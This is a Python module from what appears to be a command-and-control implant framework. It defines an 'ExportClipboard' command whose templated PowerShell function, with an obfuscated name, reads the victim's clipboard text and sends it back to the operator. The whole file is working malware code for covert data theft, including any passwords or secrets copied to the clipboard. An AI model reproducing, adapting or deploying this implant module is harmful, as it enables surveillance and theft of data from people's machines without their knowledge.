class ExportClipboard:
    type = "EC"
    args = None
    input = "export_clipboard"

    def process_implant_response(self, data, args):
        if data.decode() == "2":
            return "Clipboard is empty (Or contained only '2')", None
        else:
            return data.decode(), None

    def implant_text(self):
        var ='''
function {{ ron.obf_get_clipboard }}() {
    $b = "Text"
    $a = Get-Clipboard -Format $b
    if ($a -ne $null ){$Script:tr = $a}
    else {$Script:tr = "2"}
}'''
        return var
